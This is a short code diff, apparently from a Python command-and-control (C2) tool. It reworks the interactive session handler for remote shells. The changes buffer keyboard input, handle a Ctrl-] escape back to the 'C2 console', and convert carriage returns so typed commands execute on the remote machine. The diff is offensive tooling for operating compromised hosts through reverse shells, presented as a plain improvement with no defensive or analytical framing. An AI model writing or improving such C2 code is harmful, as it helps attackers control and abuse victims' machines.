@@ -348,7 +348,7 @@ def interactive_shell_session(shell_id: int):
     try:
         shell_socket.setblocking(False)
         while True:
-            rlist = [shell_socket, sys.stdin]
+            rlist = [shell_socket, fd]
             ready, _, _ = select(rlist, [], [], 0.1)
             for r in ready:
                 if r is shell_socket:
@@ -368,19 +368,27 @@ def interactive_shell_session(shell_id: int):
                     sys.stdout.write(data.decode(errors='ignore'))
                     sys.stdout.flush()
                 else:
-                    # stdin
+                    # stdin (read as much as available)
                     try:
-                        ch = os.read(fd, 1)
+                        buf = os.read(fd, 1024)
                     except Exception:
-                        ch = b''
-                    if not ch:
+                        buf = b''
+                    if not buf:
                         continue
-                    # Ctrl-] (0x1d) to exit
-                    if ch == b'\x1d':
+                    # Handle Ctrl-] (0x1d) to exit
+                    if b'\x1d' in buf:
+                        cut = buf.split(b'\x1d', 1)[0]
+                        if cut:
+                            try:
+                                shell_socket.sendall(cut.replace(b'\r', b'\n'))
+                            except Exception:
+                                print(f"\n[*] Failed to send to shell {shell_id}. It may have disconnected.")
                         print("\n[*] Returning to C2 console.")
                         return
+                    # Normalize CR to LF so Enter executes on remote
+                    to_send = buf.replace(b'\r', b'\n')
                     try:
-                        shell_socket.sendall(ch)
+                        shell_socket.sendall(to_send)
                     except Exception:
                         print(f"\n[*] Failed to send to shell {shell_id}. It may have disconnected.")
                         return
